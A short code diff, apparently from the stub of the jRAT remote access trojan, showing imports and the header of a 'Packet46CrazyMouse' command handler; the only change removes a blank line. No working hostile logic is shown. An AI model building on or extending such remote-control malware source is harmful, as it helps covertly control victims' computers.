@@ -7,7 +7,6 @@ import java.util.Random;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Main;
 
-
 public class Packet46CrazyMouse extends AbstractIncomingPacket {
 
 	@Override
